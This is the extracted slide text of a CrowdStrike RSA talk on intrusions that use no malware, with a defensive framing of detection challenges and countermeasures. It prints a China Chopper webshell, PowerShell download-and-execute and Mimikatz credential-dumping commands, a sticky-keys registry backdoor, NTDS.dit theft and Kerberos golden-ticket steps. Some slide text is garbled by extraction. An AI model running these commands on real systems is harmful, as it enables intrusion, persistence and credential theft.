SESSION ID: EXP-T10
HACKING  EXPOSED:     BEYOND  THE  MALWARE

GEORGE KURTZ
Co-Founder & CEO CrowdStrike Inc. @George_Kurtz

DMITRI ALPEROVITCH
Co-Founder & CTO CrowdStrike Inc. @DmitriCyber

ELIA ZAITSEV
Principal Solutions Architect CrowdStrike Inc.

#RSAC

#RSAC
A  LITTLE  ABOUT  US:  
GEORGE  KURTZ  
u In security for 20 +years u President & CEO, CrowdStrike u Former CTO, McAfee u Former CEO, Foundstone u Co-Author, Hacking Exposed
2

#RSAC
A  LITTLE  ABOUT  US:  
DMITRI  ALPEROVITCH  
u Co-Founder & CTO, CrowdStrike u Former VP Threat Research, McAfee u Author of Operation Aurora,
Night Dragon, Shady RAT u MIT Tech Review's Top 35 Innovator
Under 35 for 2013 u Foreign Policy's Top 100 Leading
Global Thinkers for 2013
3

#RSAC
A  LITTLE  ABOUT  US:  
ELIA  ZAITSEV  
u Principal Solutions Architect u Hacker Ninja
4

#RSAC
AGENDA:  
u Rise of Malware-Free Intrusions u Tradecraft u Case Studies u Deterrence u The Setup & Attack Plan u Demo u Countermeasures
5

RISE  IN  

MALWARE--

FREE  

#RSAC

INTRUSIONS  

#RSAC
INSIDER  CHALLENGE  
Insiders pose most difficult problem for security industry
  u Legitimate access and authorization   u Knowledge of network & data
u Administrator access is rarely monitored closely u Admin privileges are the keys to the kingdom
7

#RSAC
EXTERNAL     ADVERSARY  TRENDS  
60%*
*Verizon  Breach  Report  2013   8

#RSAC
GOAL:  BECOME  AN  INSIDER  
u Blend in and decrease chance of discovery u Malware is noisy u Limit suspicious external network traffic u Use tools already on the system
u No malware u No C2 u No file-based artifacts
THEY  WANT  TO  BE  YOU!  
9

TRADECRAFT  
#RSAC

Malware-FREE intrusions

#RSAC

Webshells  are  the  bomb  

WEBSHELLS:    

Remote  access  to  a  system  using  a  web  browser   Can  be  ASP  or  PHP  or  any  other  web  scripMng  language     

Simple Code:
<%@ Page Language="Jscript"%><%eval(Request.Item["password"],"unsafe");%>!
Complex Code: Greater than 1200 lines of C# code

GAIN
ACCESS

ELEVATE
PRIVILEGES

DUMP
CREDENTIALS

MAINTAIN
PERSISTENCE

INSTALL
GOLDEN TICKET

#RSAC

Chopper webshell:
!<%@Page Language="Jscript"%><%eval(Request.Item["password"],"unsafe");%>!

SECURITY CHALLENGE:
DETECTING & STOPPING A 72 BYTE BACKDOOR WRITTEN TO A WEBSERVER USING AN ARBITRARY FILE WRITE

GAIN
ACCESS

ELEVATE
PRIVILEGES

DUMP
CREDENTIALS

MAINTAIN
PERSISTENCE

INSTALL
GOLDEN TICKET

#RSAC

Windows Kernel PrivEsc in Powershell:   powershell  --execuMonPolicy  Bypass  --Command  ".  .\PrivEsc.ps1;  RunPrivEsc  payload.bat"

SECURITY CHALLENGE:
DETECTING A POWERSHELL SCRIPT THAT IS EXECUTING A 0-DAY WINDOWS KERNEL PRIVESC

GAIN
ACCESS

ELEVATE
PRIVILEGES

DUMP
CREDENTIALS

MAINTAIN
PERSISTENCE

INSTALL
GOLDEN TICKET

#RSAC

URseinagl cboamsem6a4nEdnsceovdaeddinCgotmramdiatinodnsailndtoefPeonwseesr:shell:
ppoowweerrsshhelelll-w"iInEdXowS(tNyelwe-Ohbidjdeecnt -NEextec.uWteiboCnlPioelincty).BDyoPwansslo-aednSctordiednCgo(m'mhatntdp:// D<QRAEKDAAAC0TACEgDB>w'A)G;8AIdwnBvloAkHeI-AMciwBmoiAkGaUtAzbA-BsDAuCmApACIrgeBdJAsE"UA>WACA:g\ACugsAeTrgsB\laA.HctAxLtQ!BPAGIAagBlAGMA
dAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4A ZwAoACcAaAB0AHQAcAA6AC8ALwBpAHMALgBnAGQALwBvAGUAbwBGAHUASQAnACkAOwAgAEkAbgB2AG8A awBlAC0ATQBpAG0AaQBrAGEAdAB6ACAALQBEAHUAbQBwAEMAcgBlAGQAcwAiACAAPgAgAEMAOgBcAHUA cwBlAHIAcwBcAGEALgB0AHgAdAANAAoAIAAgACAAIAANAAoA!

SECURITY CHALLENGE:
DETECTING POWERSHELL-BASED CREDENTIAL THEFT TECHNIQUES
1144

GAIN
ACCESS

ELEVATE
PRIVILEGES

DUMP
CREDENTIALS

MAINTAIN
PERSISTENCE

INSTALL
GOLDEN TICKET

#RSAC

Registry command for the debugger hack (if done locally): !
reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v "Debugger" /t REG_SZ /d "cmd.exe" /f!
! Registry command for the debugger hack (if done remotely using WMI): !
wmic /user:<REDACTED> /password:<REDACTED> /node:<REDACTED> process call create "C:\Windows\system32\reg.exe add \"HKLM \SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe\" /v \"Debugger\" /t REG_SZ /d \"cmd.exe \" /f"!
!

SECURITY CHALLENGE:
DETECTING PERSISTENCE THAT DOESN'T RELY ON A BINARY EXECUTABLE
1155

GAIN
ACCESS

ELEVATE
PRIVILEGES

DUMP
CREDENTIALS

MAINTAIN
PERSISTENCE

INSTALL
GOLDEN TICKET

#RSAC

Steal Kerberos user hash and Install Golden Ticket:!
vssadmin create shadow /for=c:! copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit c:\!
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM c:\! !
powershell "IEX (New-Object Net.WebClient).DownloadString('http://REDACTED'); Set-Variable -name cmd -value '""kerberos::golden /admin:REDACTED /domain:REDACTED /sid:REDACTED /krbtgt:REDACTED /ticket:my.ticket\"'; Invoke-Mimikatz -Command $cmd""! powershell "IEX (New-Object Net.WebClient).DownloadString('http://REDACTED'); Set-Variable -name cmd -value '""kerberos::ptt my.ticket\"'; Invoke-Mimikatz -Command $cmd""! ! wmic /authority:"kerberos:REDACTED" /node:REDACTED process call create 'cmd.exe /c powershell.exe -command "AddADGroupMember \"Organization Management\" REDACTED"'!
SECURITY CHALLENGE:
DETECTING ON-GOING ADVERSARY ACCESS TO THE ENVIRONMENT EVEN AFTER A FULL PASSWORD RESET
1166

#RSAC
POWERSHELL SCRIPTS ARE THE NEW MALWARE
THEY BYPASS WHITELISTING, AV, IOC DETECTION AND MATH...
17

CASE  STUDIES  
#RSAC

#RSAC

COMPROMISE     AT  A  LARGE   SOPHISTICATED   COMPANY  

u Problem: Advanced adversary keeps returning and can't be stopped
u Existing Tools: Proxies, Network & Endpoint Forensics, IOC Scanners
u Challenge: Find and block C2
u Fail: No malware or C2 u Tradecraft:
u Stolen creds & two-factor seeds u Persistent Access via VPN

WHO IS
HURRICANE PANDA?

OperaAonal  Window:  Mid  2013  ­  Present  
TargeAng:  TelecommunicaMons  &  Technology  
ObjecAves:  Recon,  Lateral  Movement,  IP  TheY  
LocaAons:  United  States,  Japan  
Tools:  Chopper  Webshell,  Windows  PrivEsc  0--Day  
CapabiliAes:   Zero--day  exploit  development   Remote  Access  Tools:  Use  of  malware  and     webshells  for  remote  access   EscalaAon:  Privileges  and  lateral  movement     with  credenMal  dumping  tools   Exfil:  Usage  of  FTP  to  send  data  out  of     an  organizaMon     

#RSAC

#RSAC 21

SETUP  &     ATTACK  PLAN  
#RSAC

ATTACK OVERVIEW

(1)  SQL  InjecMon   (2)  Deploy  China  Chopper  Webshell   (3)  Conduct  Reconnaissance   (4)  Elevate  Privileges   (5)  Dump  Creds     

External  Website  

IIS  Server  

#RSAC

Domain   Controller  
Exchange   Server  

(6)  Deploy  SMcky  Keys  regkeys  on  DC   (7)  RDP  into  DC   (8)  Use  Volume  Shadow  Copy  to  steal   NTDS.dit  file   (9)  Extract  Kerberos  user  hash  offline   (10)  Generate  and  insert  Kerberos  Golden   Ticket        
(11)  Add  addiMonal  privileges  to  our  user   account   (12)  Steal  Exchange  mailbox  via  powershell   (13)  Exfiltrate  mailbox  via  webshell        

Internal  Domain   23

DEMO  
#RSAC

COUNTERMEASURES  
#RSAC

Indicators of attack

#RSAC

VS.  INDICATORS  OF  COMPROMISE  

IOCs
Malware, Signatures,
Exploits, Vulnerabilities, IP Addresses

REACTIVE  INDICATORS  OF   COMPROMISE   VS    
PROACTIVE  INDICATORS  OF   ATTACK  

IOAs
Code Execution,
Persistence, Stealth, Command &
Control, Lateral
Movement

#RSAC
FREE  TOOL  RELEASE  
u CrowdResponse by CrowdStrike's Robin Keir u Sticky Keys Module u Demo u Get it now at http://blog.crowdstrike.com/
27

#RSAC
GOOD  DEFENSE   PRACTICES  
u Kerberos Golden Ticket Check (Microsoft powershell script) https://gallery.technet.microsoft.com/scriptcenter/Kerberos-Golden-Ticket-b4814285
u Only allow signed Powershell scripts to execute: u Set-ExecutionPolicy AllSigned
u Disable Reflection/Invocation in Powershell: u Restricted Language
28

#RSAC
CROWDSTRIKE  FALCON  PLATFORM  
NEXT--GENERATION  ENDPOINT  PROTECTION    
u Immediately detect adversary activity and confidently protect your organization from advanced malware and targeted attacks
u Industry's first true SaaS next-generation platform ­ delivering the fastest and most effective detection and prevention of known and unknown threats
KEEP ADVERSARIES OFF OF YOUR ENDPOINTS AND OUT OF YOUR NETWORK
u REQUEST A DEMO OF CROWDSTRIKE FALCON: HTTP://WWW.CROWDSTRIKE.COM/REQUEST-A-DEMO
29

#RSAC
THANK  YOU!  
u HOW TO REACH US:
u TWITTER: @GEORGE_KURTZ | @DMITRICYBER | @CROWDSTRIKE
u FOR MORE INFORMATION ON CROWDSTRIKE FALCON:
u SALES@CROWDSTRIKE.COM
u REQUEST A DEMO:
u WWW.CROWDSTRIKE.COM/REQUEST-A-DEMO/
30

